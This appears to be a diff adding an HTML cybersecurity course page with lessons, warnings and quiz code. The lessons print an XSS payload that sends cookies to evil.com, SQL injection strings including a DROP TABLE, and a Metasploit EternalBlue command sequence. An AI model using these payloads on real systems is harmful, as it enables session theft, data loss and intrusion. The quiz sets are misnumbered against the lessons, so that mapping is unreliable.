+  Defence: HTTPS, VPN, certificate pinning.
+
+<span class="hi">ARP Poisoning</span>
+  Attacker sends fake ARP replies on a LAN.
+  Associates attacker's MAC with legitimate IP.
+  All traffic meant for that IP goes to attacker instead.
+
+<span class="hi">DNS Spoofing</span>
+  Corrupt DNS cache — redirect domain to attacker's IP.
+  User types google.com → lands on fake site.
+
+<span class="hi">Port Scanning</span>
+  Discovering open ports to find attack entry points.
+  Tool: Nmap (Network Mapper) — educational use only.</pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Network Security Controls</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre><span class="hi">Firewall</span>
+  Monitors and filters incoming/outgoing traffic.
+  Rules: allow/block based on IP, port, protocol.
+  Types: packet filter, stateful, application-layer (WAF).
+
+<span class="hi">IDS — Intrusion Detection System</span>
+  MONITORS network traffic and alerts on suspicious activity.
+  Does NOT block — only detects and logs.
+
+<span class="hi">IPS — Intrusion Prevention System</span>
+  Like IDS but ACTIVELY blocks detected threats in real-time.
+
+<span class="hi">VPN — Virtual Private Network</span>
+  Encrypts all traffic between device and VPN server.
+  Hides your real IP — makes traffic look like it's from VPN.
+  Essential on public Wi-Fi.
+
+<span class="hi">DMZ — Demilitarized Zone</span>
+  Network zone between public internet and private LAN.
+  Public-facing servers (web, email) placed here.
+  Protects internal network if DMZ server is compromised.
+
+<span class="hi">NAC — Network Access Control</span>
+  Checks device health before allowing network access.
+  e.g. must have antivirus, OS updates, no malware.</pre>
+        </div>
+
+        <div class="tip-box">
+          <span class="tip-icon">💡</span>
+          <p>Always use <strong>HTTPS</strong> — it encrypts data between browser and server. HTTP sends everything in plain text — anyone on the same network can read it. Check for the padlock in your browser's address bar.</p>
+        </div>
+        
+        <div class="quiz-section" id="quiz-3">
+          <div class="quiz-title">📝 Lesson 3 Quiz — Score 85%+ to proceed</div>
+          <div id="quiz-opts-3"></div>
+          <button class="quiz-submit-btn" id="quiz-submit-3" onclick="submitQuiz(3)">Submit Answers</button>
+          <div class="quiz-result" id="quiz-result-3" style="display:none"></div>
+        </div>
+        <div class="lesson-footer">
+          <button class="mark-done-btn" id="btn3" onclick="markDone(3)">✓ Mark as Done</button>
+          <button class="next-btn" onclick="openNext(4)">Next: Cryptography →</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- LESSON 4 -->
+    <div class="lesson-card" id="lesson4">
+      <div class="lesson-header" onclick="toggle(4)">
+        <span class="lesson-num-badge">04</span>
+        <div class="lesson-heading"><h3>Cryptography — Encryption, Hashing &amp; PKI</h3><span>symmetric, asymmetric, hashing, SSL/TLS, certificates · ~12 min</span></div>
+        <span class="done-badge" id="done4" style="display:none">✓ Done</span>
+        <span class="lesson-chevron" id="chev4">▼</span>
+        <span class="lock-icon" id="lock-icon-4"></span>
+      </div>
+      <div class="lesson-body" id="body4">
+        <p><strong style="color:#fff">Cryptography</strong> is the science of hiding information. It is the backbone of secure communication on the internet — used in HTTPS, banking, messaging, and much more.</p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Symmetric vs Asymmetric Encryption</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre><span class="hi">Symmetric Encryption</span>
+  Same key to encrypt AND decrypt.
+  Fast — good for large data.
+  Problem: how do you securely share the key?
+  Algorithms: AES (most common), DES (old, weak), 3DES
+
+  Alice  ──[encrypt with key]──►  Ciphertext  ──[decrypt with same key]──►  Bob
+
+<span class="hi">Asymmetric Encryption (Public Key Cryptography)</span>
+  Two keys: PUBLIC key (share with everyone) + PRIVATE key (keep secret).
+  What public key encrypts, only private key can decrypt.
+  Slower than symmetric — used to exchange symmetric keys.
+  Algorithms: RSA, ECC, Diffie-Hellman
+
+  Alice encrypts with Bob's PUBLIC key.
+  Only Bob's PRIVATE key can decrypt it.
+  Even Alice can't decrypt what she encrypted!</pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Hashing</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre><span class="hi">Hashing</span> — one-way transformation, not encryption!
+  Input → Hash function → Fixed-length output (digest)
+  Cannot be reversed — you can't get original from hash.
+  Same input ALWAYS gives same hash.
+
+Common algorithms:
+  MD5    — 128-bit, BROKEN (collision attacks possible)
+  SHA-1  — 160-bit, BROKEN
+  SHA-256— 256-bit, SECURE ✅  (used in Bitcoin, TLS)
+  SHA-512— 512-bit, very secure ✅
+
+Uses of hashing:
+  • Password storage (never store plain passwords!)
+  • File integrity checking (detect tampering)
+  • Digital signatures
+  • Blockchain
+
+<span class="cm">── Password hashing with salt ──</span>
+Problem: same password → same hash → rainbow tables attack
+Solution: add a random SALT before hashing
+  password = "abc123"
+  salt = "x7fQ2"
+  store: sha256("abc123" + "x7fQ2") + salt</pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">SSL/TLS &amp; Digital Certificates</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre"><span class="hi">TLS Handshake</span> (what happens when you visit HTTPS site):
+  1. Client sends: "Hello, I support these cipher suites"
+  2. Server sends: its digital certificate + public key
+  3. Client verifies certificate with trusted CA
+  4. Client generates session key, encrypts with server's public key
+  5. Server decrypts session key with its private key
+  6. Both now communicate using fast symmetric encryption
+
+<span class="hi">Digital Certificate</span>
+  Issued by a Certificate Authority (CA) — e.g. DigiCert, Let's Encrypt.
+  Contains: domain name, public key, expiry, CA signature.
+  Proves the server is who it claims to be.
+
+<span class="hi">PKI — Public Key Infrastructure</span>
+  The system of CAs, certificates, and policies
+  that makes trust on the internet possible.</pre>
+        </div>
+
+        <div class="tip-box warning">
+          <span class="tip-icon">⚡</span>
+          <p><strong>Remember:</strong> Encryption is reversible (with the key). Hashing is NOT reversible. Passwords must be hashed + salted, never encrypted — if the key is stolen, all passwords are exposed.</p>
+        </div>
+        
+        <div class="quiz-section" id="quiz-4">
+          <div class="quiz-title">📝 Lesson 4 Quiz — Score 85%+ to proceed</div>
+          <div id="quiz-opts-4"></div>
+          <button class="quiz-submit-btn" id="quiz-submit-4" onclick="submitQuiz(4)">Submit Answers</button>
+          <div class="quiz-result" id="quiz-result-4" style="display:none"></div>
+        </div>
+        <div class="lesson-footer">
+          <button class="mark-done-btn" id="btn4" onclick="markDone(4)">✓ Mark as Done</button>
+          <button class="next-btn" onclick="openNext(5)">Next: Ethical Hacking →</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- LESSON 5 -->
+    <div class="lesson-card" id="lesson5">
+      <div class="lesson-header" onclick="toggle(5)">
+        <span class="lesson-num-badge">05</span>
+        <div class="lesson-heading"><h3>Ethical Hacking — The 5 Phases of Penetration Testing</h3><span>reconnaissance, scanning, exploitation, post-exploitation, reporting · ~12 min</span></div>
+        <span class="done-badge" id="done5" style="display:none">✓ Done</span>
+        <span class="lesson-chevron" id="chev5">▼</span>
+        <span class="lock-icon" id="lock-icon-5"></span>
+      </div>
+      <div class="lesson-body" id="body5">
+        <p>A <strong style="color:#fff">penetration test (pentest)</strong> is an authorised simulated attack on a system to find vulnerabilities before real attackers do. Ethical hackers follow a structured 5-phase methodology.</p>
+
+        <div class="phase-steps">
+          <div class="phase-step">
+            <span class="phase-num">01</span>
+            <div class="phase-content">
+              <strong>Reconnaissance (Information Gathering)</strong>
+              <span>Collect as much information as possible about the target without touching their systems. Passive = no direct contact. Active = scanning their servers.</span>
+            </div>
+          </div>
+          <div class="phase-step">
+            <span class="phase-num">02</span>
+            <div class="phase-content">
+              <strong>Scanning &amp; Enumeration</strong>
+              <span>Actively probe the target — find open ports, running services, OS version, user accounts. Tools: Nmap, Nessus, Nikto.</span>
+            </div>
+          </div>
+          <div class="phase-step">
+            <span class="phase-num">03</span>
+            <div class="phase-content">
+              <strong>Gaining Access (Exploitation)</strong>
+              <span>Use discovered vulnerabilities to actually break in. Exploit unpatched software, weak passwords, SQL injection, etc. Tools: Metasploit.</span>
+            </div>
+          </div>
+          <div class="phase-step">
+            <span class="phase-num">04</span>
+            <div class="phase-content">
+              <strong>Maintaining Access (Post-Exploitation)</strong>
+              <span>In a real attack, hackers install backdoors to stay in the system. In ethical hacking, you document what a real attacker COULD do from this position.</span>
+            </div>
+          </div>
+          <div class="phase-step">
+            <span class="phase-num">05</span>
+            <div class="phase-content">
+              <strong>Reporting</strong>
+              <span>Write a detailed report of every vulnerability found, how it was exploited, the risk level, and how to fix it. This is what the client pays for.</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Reconnaissance Techniques</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre><span class="cm">── PASSIVE Reconnaissance (no direct contact) ──</span>
+<span class="hi">OSINT</span> (Open Source Intelligence)
+  • Google dorking: site:target.com filetype:pdf
+  • LinkedIn: find employee names, job roles, tech stack
+  • Whois: find domain registration details
+  • Shodan: search engine for internet-connected devices
+  • Wayback Machine: old versions of websites
+  • theHarvester: gather emails, subdomains from public sources
+
+<span class="cm">── ACTIVE Reconnaissance (direct contact) ──</span>
+<span class="hi">DNS enumeration</span>
+  Discover subdomains, mail servers, nameservers.
+  Tools: dnsenum, fierce, subfinder
+
+<span class="hi">Social engineering reconnaissance</span>
+  Call the company helpdesk, ask casual questions.
+  Most people reveal information when asked politely.</pre>
+        </div>
+
+        <div class="tip-box danger">
+          <span class="tip-icon">⚠️</span>
+          <p><strong>Legal note:</strong> Every pentest requires a signed <strong>Rules of Engagement</strong> document and written permission from the target organisation. Without it, every technique in this lesson is illegal — even passive recon can cross legal lines in some jurisdictions.</p>
+        </div>
+        
+        <div class="quiz-section" id="quiz-5">
+          <div class="quiz-title">📝 Lesson 5 Quiz — Score 85%+ to proceed</div>
+          <div id="quiz-opts-5"></div>
+          <button class="quiz-submit-btn" id="quiz-submit-5" onclick="submitQuiz(5)">Submit Answers</button>
+          <div class="quiz-result" id="quiz-result-5" style="display:none"></div>
+        </div>
+        <div class="lesson-footer">
+          <button class="mark-done-btn" id="btn5" onclick="markDone(5)">✓ Mark as Done</button>
+          <button class="next-btn" onclick="openNext(6)">Next: Scanning →</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- LESSON 6 -->
+    <div class="lesson-card" id="lesson6">
+      <div class="lesson-header" onclick="toggle(6)">
+        <span class="lesson-num-badge">06</span>
+        <div class="lesson-heading"><h3>Scanning &amp; Enumeration — Finding Vulnerabilities</h3><span>Nmap, port scanning, vulnerability scanning, Metasploit · ~12 min</span></div>
+        <span class="done-badge" id="done6" style="display:none">✓ Done</span>
+        <span class="lesson-chevron" id="chev6">▼</span>
+        <span class="lock-icon" id="lock-icon-6"></span>
+      </div>
+      <div class="lesson-body" id="body6">
+        <p>Scanning is the process of <strong style="color:#fff">actively probing a target</strong> to discover its open ports, running services, operating system and potential vulnerabilities. This phase maps the target's attack surface.</p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Nmap — Network Mapper</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre><span class="cm"># Nmap is the industry-standard port scanner</span>
+<span class="cm"># ONLY use on systems you OWN or have permission to scan</span>
+
+<span class="cm"># Basic scan — check if host is alive</span>
+nmap <span class="num">192.168.1.1</span>
+
+<span class="cm"># Scan specific ports</span>
+nmap -p <span class="num">80,443,22,3389</span> <span class="num">192.168.1.1</span>
+
+<span class="cm"># Scan all 65535 ports</span>
+nmap -p- <span class="num">192.168.1.1</span>
+
+<span class="cm"># Service and version detection</span>
+nmap -sV <span class="num">192.168.1.1</span>
+
+<span class="cm"># OS detection</span>
+nmap -O <span class="num">192.168.1.1</span>
+
+<span class="cm"># Aggressive scan (OS + version + scripts + traceroute)</span>
+nmap -A <span class="num">192.168.1.1</span>
+
+<span class="cm"># Stealth scan (SYN scan — less detectable)</span>
+nmap -sS <span class="num">192.168.1.1</span></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Common Ports to Know</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre"><span class="cm">Port  | Service    | Notes</span>
+<span class="hi">21</span>    | FTP        | File transfer — often misconfigured
+<span class="hi">22</span>    | SSH        | Secure shell — brute force target
+<span class="hi">23</span>    | Telnet     | Old, unencrypted — dangerous if open
+<span class="hi">25</span>    | SMTP       | Email sending
+<span class="hi">53</span>    | DNS        | Domain resolution
+<span class="hi">80</span>    | HTTP       | Web (unencrypted)
+<span class="hi">443</span>   | HTTPS      | Web (encrypted)
+<span class="hi">445</span>   | SMB        | Windows file sharing — EternalBlue
+<span class="hi">3306</span>  | MySQL      | Database — never expose to internet
+<span class="hi">3389</span>  | RDP        | Windows remote desktop — brute force target
+<span class="hi">8080</span>  | HTTP-alt   | Common for dev servers</pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Vulnerability Scanning &amp; Metasploit</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre"><span class="cm">── Vulnerability Scanners ──</span>
+<span class="hi">Nessus</span>   — most popular enterprise vulnerability scanner
+<span class="hi">OpenVAS</span>  — free, open-source alternative
+<span class="hi">Nikto</span>    — web server vulnerability scanner
+
+<span class="cm">── Metasploit Framework ──</span>
+The most widely used penetration testing tool.
+Exploits known vulnerabilities with pre-built modules.
+
+<span class="cm"># Basic Metasploit workflow</span>
+msfconsole                         <span class="cm"># start Metasploit</span>
+search eternalblue                 <span class="cm"># search for exploits</span>
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <span class="num">192.168.1.100</span>          <span class="cm"># target IP</span>
+set LHOST <span class="num">192.168.1.10</span>            <span class="cm"># your IP</span>
+run                                <span class="cm"># launch exploit</span>
+
+<span class="cm">⚠️  Only on systems you own or have permission to test</span></pre>
+        </div>
+
+        <div class="tip-box warning">
+          <span class="tip-icon">⚡</span>
+          <p>Practice in a <strong>safe lab environment</strong> — set up VMs using VirtualBox or VMware with intentionally vulnerable machines like <strong>Metasploitable</strong>, <strong>HackTheBox</strong> or <strong>TryHackMe</strong>. Never practice on real systems without permission.</p>
+        </div>
+        
+        <div class="quiz-section" id="quiz-6">
+          <div class="quiz-title">📝 Lesson 6 Quiz — Score 85%+ to proceed</div>
+          <div id="quiz-opts-6"></div>
+          <button class="quiz-submit-btn" id="quiz-submit-6" onclick="submitQuiz(6)">Submit Answers</button>
+          <div class="quiz-result" id="quiz-result-6" style="display:none"></div>
+        </div>
+        <div class="lesson-footer">
+          <button class="mark-done-btn" id="btn6" onclick="markDone(6)">✓ Mark as Done</button>
+          <button class="next-btn" onclick="openNext(7)">Next: Web Security →</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- LESSON 7 -->
+    <div class="lesson-card" id="lesson7">
+      <div class="lesson-header" onclick="toggle(7)">
+        <span class="lesson-num-badge">07</span>
+        <div class="lesson-heading"><h3>Web Application Security — OWASP Top 10</h3><span>SQL injection, XSS, CSRF, broken auth, IDOR · ~13 min</span></div>
+        <span class="done-badge" id="done7" style="display:none">✓ Done</span>
+        <span class="lesson-chevron" id="chev7">▼</span>
+        <span class="lock-icon" id="lock-icon-7"></span>
+      </div>
+      <div class="lesson-body" id="body7">
+        <p>Web applications are the most attacked surface on the internet. The <strong style="color:#fff">OWASP Top 10</strong> is the globally recognised list of the most critical web vulnerabilities. Every web developer and security professional must know these.</p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">SQL Injection (SQLi)</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre><span class="cm">── Attacker injects malicious SQL into web inputs ──</span>
+
+Vulnerable login form:
+  SQL: SELECT * FROM users WHERE username='<span class="r">INPUT</span>' AND password='<span class="r">INPUT</span>'
+
+Normal input:    username = admin,  password = pass123
+Attacker input:  username = <span class="r">admin'--</span>
+Result SQL:      SELECT * FROM users WHERE username='admin'<span class="r">--</span>' AND password='...'
+                                                          ^ comment! password check bypassed!
+
+Attacker logs in as admin without knowing the password!
+
+Other payloads:
+  <span class="r">' OR '1'='1</span>        — always true, returns all records
+  <span class="r">'; DROP TABLE users--</span>  — deletes the table!
+
+<span class="cm">── Prevention ──</span>
+<span class="g">✅</span> Use parameterised queries / prepared statements
+<span class="g">✅</span> Never build SQL by concatenating user input
+<span class="g">✅</span> Input validation and sanitisation
+<span class="g">✅</span> Use an ORM (Object-Relational Mapper)</pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">XSS, CSRF &amp; Other Key Vulnerabilities</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre"><span class="hi">XSS — Cross-Site Scripting</span>
+  Inject malicious JavaScript into a web page.
+  Runs in victim's browser — steals cookies, session tokens.
+  
+  Payload: <span class="r">&lt;script&gt;document.location='http://evil.com?c='+document.cookie&lt;/script&gt;</span>
+  
+  Prevention: escape/encode all user output. Use Content Security Policy (CSP).
+
+<span class="hi">CSRF — Cross-Site Request Forgery</span>
+  Trick victim's browser into making requests they didn't intend.
+  e.g. victim visits evil site → it silently sends bank transfer request
+       using victim's cookies (already logged in to bank).
+  Prevention: CSRF tokens, SameSite cookies, verify Referer header.
+
+<span class="hi">IDOR — Insecure Direct Object Reference</span>
+  Accessing resources by changing an ID in the URL.
+  e.g. /profile?id=1234  → change to /profile?id=1235 → see someone else's profile!
+  Prevention: check authorisation on every request, not just at login.
+
+<span class="hi">Broken Authentication</span>
+  Weak session management, no lockout on login attempts.
+  Prevention: strong session tokens, MFA, account lockout, HTTPS.
+
+<span class="hi">Security Misconfiguration</span>
+  Default passwords, open admin panels, directory listing enabled.
+  Prevention: harden configurations, disable defaults, security checklists.</pre>
+        </div>
+
+        <div class="tip-box success">
+          <span class="tip-icon">🏆</span>
+          <p>Practice web security safely on <strong>DVWA</strong> (Damn Vulnerable Web Application), <strong>bWAPP</strong>, or <strong>WebGoat</strong> — deliberately vulnerable apps designed for learning. Also try <strong>PortSwigger Web Security Academy</strong> — it's free and excellent.</p>
+        </div>
+        
+        <div class="quiz-section" id="quiz-7">
+          <div class="quiz-title">📝 Lesson 7 Quiz — Score 85%+ to proceed</div>
+          <div id="quiz-opts-7"></div>
+          <button class="quiz-submit-btn" id="quiz-submit-7" onclick="submitQuiz(7)">Submit Answers</button>
+          <div class="quiz-result" id="quiz-result-7" style="display:none"></div>
+        </div>
+        <div class="lesson-footer">
+          <button class="mark-done-btn" id="btn7" onclick="markDone(7)">✓ Mark as Done</button>
+          <button class="next-btn" onclick="openNext(8)">Next: Defence →</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- LESSON 8 -->
+    <div class="lesson-card" id="lesson8">
+      <div class="lesson-header" onclick="toggle(8)">
+        <span class="lesson-num-badge">08</span>
+        <div class="lesson-heading"><h3>Defence &amp; Incident Response</h3><span>hardening, SIEM, incident response, forensics, certifications · ~10 min</span></div>
+        <span class="done-badge" id="done8" style="display:none">✓ Done</span>
+        <span class="lesson-chevron" id="chev8">▼</span>
+        <span class="lock-icon" id="lock-icon-8"></span>
+      </div>
+      <div class="lesson-body" id="body8">
+        <p>Understanding attacks is only half the job. The other half is <strong style="color:#fff">building strong defences</strong> and responding effectively when breaches do occur. This is the Blue Team side of cybersecurity.</p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Security Hardening Best Practices</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre"><span class="cm">── System hardening ──</span>
+<span class="g">✅</span> Keep ALL software updated — patch vulnerabilities fast
+<span class="g">✅</span> Principle of least privilege — users only get what they need
+<span class="g">✅</span> Disable unnecessary services and ports
+<span class="g">✅</span> Enable full disk encryption (BitLocker, FileVault)
+<span class="g">✅</span> Enforce strong password policy + MFA everywhere
+<span class="g">✅</span> Regular backups — 3-2-1 rule:
+     3 copies, 2 different media, 1 offsite
+
+<span class="cm">── Network hardening ──</span>
+<span class="g">✅</span> Firewall with deny-all default rule
+<span class="g">✅</span> Network segmentation — separate departments/devices
+<span class="g">✅</span> VPN for remote workers
+<span class="g">✅</span> Monitor logs — know what "normal" looks like
+
+<span class="cm">── Password security ──</span>
+<span class="g">✅</span> Use a password manager (Bitwarden, KeePass)
+<span class="g">✅</span> Unique password for EVERY account
+<span class="g">✅</span> 12+ characters, mix of types
+<span class="r">❌</span> Never reuse passwords
+<span class="r">❌</span> Never store plain text passwords</pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Incident Response &amp; SIEM</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre"><span class="cm">── SIEM — Security Information and Event Management ──</span>
+Collects and analyses logs from across the network.
+Alerts security team to suspicious patterns in real-time.
+Tools: Splunk, IBM QRadar, Microsoft Sentinel
+
+<span class="cm">── Incident Response Process ──</span>
+<span class="num">1.</span> <span class="hi">Preparation</span>   — have a plan ready before incidents happen
+<span class="num">2.</span> <span class="hi">Identification</span>— detect and confirm a breach occurred
+<span class="num">3.</span> <span class="hi">Containment</span>   — isolate affected systems to stop spread
+<span class="num">4.</span> <span class="hi">Eradication</span>  — remove malware, close entry points
+<span class="num">5.</span> <span class="hi">Recovery</span>      — restore systems from clean backups
+<span class="num">6.</span> <span class="hi">Lessons Learned</span>— document what happened, improve defences
+
+<span class="cm">── Digital Forensics ──</span>
+Collecting and preserving evidence after an incident.
+• Image hard drives (bit-for-bit copies)
+• Maintain chain of custody
+• Analyse logs, memory dumps, network captures
+Tools: Autopsy, Wireshark, Volatility</pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="code-lang">Cybersecurity Certifications to Pursue</span><button class="copy-btn" onclick="copyCode(this)">📋 Copy</button></div>
+          <pre"><span class="cm">── Beginner ──</span>
+<span class="hi">CompTIA Security+</span>  — industry standard, vendor-neutral
+<span class="hi">Cisco CyberOps</span>     — Anotida is Cisco certified! Great start
+<span class="g">TryHackMe</span>          — free learning platform, great for beginners
+
+<span class="cm">── Intermediate ──</span>
+<span class="hi">CEH</span> — Certified Ethical Hacker (EC-Council)
+<span class="hi">eJPT</span>— eLearnSecurity Junior Penetration Tester (affordable)
+<span class="g">HackTheBox</span>         — practice labs with real scenarios
+
+<span class="cm">── Advanced ──</span>
+<span class="hi">OSCP</span>— Offensive Security Certified Professional (hardest, most respected)
+<span class="hi">CISSP</span>— for security managers/architects
+<span class="hi">CISM</span> — Certified Information Security Manager</pre>
+        </div>
+
+        <div class="tip-box success">
+          <span class="tip-icon">🏆</span>
+          <p>You've completed all 8 cybersecurity lessons! The best next step is <strong>hands-on practice</strong> — create a free account on <strong>TryHackMe</strong> or <strong>HackTheBox</strong> and start the beginner paths. For guided learning with Anotida, hit the button below! 🔐</p>
+        </div>
+        
+        <div class="quiz-section" id="quiz-8">
+          <div class="quiz-title">📝 Lesson 8 Quiz — Score 85%+ to proceed</div>
+          <div id="quiz-opts-8"></div>
+          <button class="quiz-submit-btn" id="quiz-submit-8" onclick="submitQuiz(8)">Submit Answers</button>
+          <div class="quiz-result" id="quiz-result-8" style="display:none"></div>
+        </div>
+        <div class="lesson-footer">
+          <button class="mark-done-btn" id="btn8" onclick="markDone(8)">✓ Mark as Done</button>
+          <button class="next-btn" onclick="completeAll()">🏆 Complete Course!</button>
+        </div>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<div class="bottom-cta">
+  <div class="cta-card">
+    <div style="font-size:3rem;margin-bottom:1rem;">🔐</div>
+    <h2>Ready to go deeper?</h2>
+    <p>These 8 lessons give you a solid foundation. For hands-on labs, CTF challenges, exam prep, or BSc IT cybersecurity module help — get personal tutoring from Anotida.</p>
+    <div class="cta-btns">
+      <a class="cta-btn-main" href="https://wa.me/260768648291?text=Hi%20Anotida!%20I%20completed%20your%20Cybersecurity%20lessons%20and%20want%20to%20learn%20more!" target="_blank">💬 Book a Cybersecurity Session</a>
+      <a class="cta-btn-sec" href="./index.html">← Back to Home 🏠</a>
+    </div>
+  </div>
+</div>
+
+<script>
+
+// ── QUIZ DATA ──
+const QUIZZES = {
+  1: [
+    {q:'What does the "C" in the CIA Triad stand for?', opts:['Cryptography', 'Confidentiality', 'Cybersecurity', 'Compliance'], ans:1},
+    {q:'Which CIA principle ensures data has not been tampered with?', opts:['Availability', 'Confidentiality', 'Integrity', 'Authentication'], ans:2},
+    {q:'What is a White Hat hacker?', opts:['A criminal hacker', 'A government spy', 'An ethical hacker working with permission', 'A beginner hacker'], ans:2},
+    {q:'Availability in cybersecurity means?', opts:['Encrypting all data', 'Only admins can access data', 'Systems are accessible when needed', 'Data cannot be modified'], ans:2},
+  ],
+  2: [
+    {q:'Which malware self-replicates across networks WITHOUT user action?', opts:['Virus', 'Ransomware', 'Trojan', 'Worm'], ans:3},
+    {q:'What does ransomware do?', opts:['Spies on users', 'Encrypts files and demands payment', 'Deletes system files', 'Shows advertisements'], ans:1},
+    {q:'Which malware hides deep in the OS and is hard to detect?', opts:['Adware', 'Spyware', 'Rootkit', 'Keylogger'], ans:2},
+    {q:'A Trojan Horse differs from a virus because it?', opts:['Spreads automatically', 'Does not disguise itself', 'Does not self-replicate but hides as legitimate software', 'Is always detected by antivirus'], ans:2},
+  ],
+  3: [
+    {q:'What is spear phishing?', opts:['Mass fake emails', 'Targeted phishing using personal details about the victim', 'Phone phishing', 'SMS phishing'], ans:1},
+    {q:'Baiting in social engineering involves?', opts:['Fake phone calls', 'Impersonating IT support', 'Leaving infected USB drives for victims to find', 'Following someone through a door'], ans:2},
+    {q:'Which red flag indicates a phishing email?', opts:['Personalised greeting', 'Comes from a known domain', 'Creates extreme urgency and poor grammar', 'Has a company logo'], ans:2},
+    {q:'What is pretexting?', opts:['A type of malware', 'Creating a false scenario to manipulate someone into giving info', 'A network attack', 'A form of encryption'], ans:1},
+  ],
+  4: [
+    {q:'What is the main difference between symmetric and asymmetric encryption?', opts:['Speed only', 'Symmetric uses one key for both encrypt/decrypt; asymmetric uses a key pair', 'Symmetric is older and broken', 'Asymmetric cannot decrypt'], ans:1},
+    {q:'Which algorithm is commonly used for symmetric encryption?', opts:['RSA', 'ECC', 'AES', 'SHA-256'], ans:2},
+    {q:'What is hashing?', opts:['Two-way encryption', 'Reversible encoding', 'A one-way function producing a fixed-size digest', 'Compressing files'], ans:2},
+    {q:'Why is password salting used?', opts:['To make passwords longer', 'To make passwords human-readable', 'To prevent rainbow table attacks on hashed passwords', 'To encrypt the password twice'], ans:2},
+  ],
+  5: [
+    {q:'What does an IPS do that an IDS does not?', opts:['Logs traffic', 'Detects suspicious traffic', 'Actively blocks malicious traffic', 'Encrypts traffic'], ans:2},
+    {q:'What is a DMZ in network security?', opts:['A type of malware', 'A segment between public internet and internal LAN for public-facing servers', 'A VPN protocol', 'A firewall rule'], ans:1},
+    {q:'In a Man-in-the-Middle attack, the attacker?', opts:['Floods the server with requests', 'Secretly intercepts communication between two parties', 'Installs ransomware', 'Sends phishing emails'], ans:1},
+    {q:'What does a VPN primarily provide?', opts:['Faster internet', 'Free internet access', 'An encrypted tunnel protecting data in transit', 'A firewall'], ans:2},
+  ],
+  6: [
+    {q:'How many phases are in the ethical hacking methodology?', opts:['3', '4', '5', '6'], ans:2},
+    {q:'What is the FIRST phase of ethical hacking?', opts:['Exploitation', 'Scanning', 'Reconnaissance', 'Reporting'], ans:2},
+    {q:'What is the MOST important phase of a penetration test?', opts:['Exploitation', 'Maintaining access', 'Reporting and remediation', 'Scanning'], ans:2},
+    {q:'What does Black Box testing mean?', opts:['Tester has full system knowledge', 'Tester has partial knowledge', 'Tester has NO prior knowledge of the target', 'Tester only tests the database'], ans:2},
+  ],
+  7: [
+    {q:'What does OSINT stand for?', opts:['Online Security Intelligence Testing', 'Open Source Intelligence — publicly available information', 'Operational Security Integration', 'Official System Information Toolkit'], ans:1},
+    {q:'What is Shodan?', opts:['A hacking framework', 'A search engine for internet-connected devices', 'A password cracker', 'A VPN service'], ans:1},
+    {q:'Which Nmap flag detects service version information?', opts:['nmap -A', '-p', 'nmap -sV', 'nmap -sS'], ans:2},
+    {q:'What does an open port 22 typically indicate?', opts:['HTTP web server', 'MySQL database', 'SSH service running', 'FTP service'], ans:2},
+  ],
+  8: [
+    {q:'What does SQL Injection exploit?', opts:['Weak passwords', 'Unvalidated user input inserted into SQL queries', 'Open network ports', 'Outdated antivirus'], ans:1},
+    {q:'What is stored XSS?', opts:['JavaScript injected and stored on the server, executed on every visit', 'A one-time redirect attack', 'A SQL attack', 'A brute force attack'], ans:0},
+    {q:'What is IDOR?', opts:['Accessing resources by manipulating ID parameters without authorisation', 'A type of malware', 'A network protocol', 'An encryption standard'], ans:0},
+    {q:'What is the best defence against SQL Injection?', opts:['Using HTTPS', 'Long passwords', 'Parameterised queries / prepared statements', 'Antivirus software'], ans:2},
+  ],
+  9: [
+    {q:'What does the principle of least privilege mean?', opts:['Everyone has admin access', 'Give users only the minimum access they need', 'Encrypt everything', 'Never allow remote access'], ans:1},
+    {q:'What is the 3-2-1 backup rule?', opts:['3 passwords, 2 accounts, 1 admin', '3 copies, 2 media types, 1 offsite copy', '3 daily backups, 2 weekly, 1 monthly', '3 servers, 2 firewalls, 1 IDS'], ans:1},
+    {q:'What is the FIRST step in incident response?', opts:['Eradication', 'Containment', 'Recovery', 'Preparation'], ans:3},
+    {q:'What does MFA stand for?', opts:['Managed Firewall Access', 'Multi-Factor Authentication', 'Maximum File Access', 'Monitored Firewall Application'], ans:1},
+  ],
+};
+
+// ── LESSON LOCK / QUIZ / PROGRESS SYSTEM ──
+const TOTAL = 9;
+const KEY   = 'cyber-lessons-done';
+
+function getDone(){
+  try{ return JSON.parse(localStorage.getItem(KEY) || '{}'); }catch{ return {}; }
+}
+
+function isUnlocked(n){
+  if(n === 1) return true;
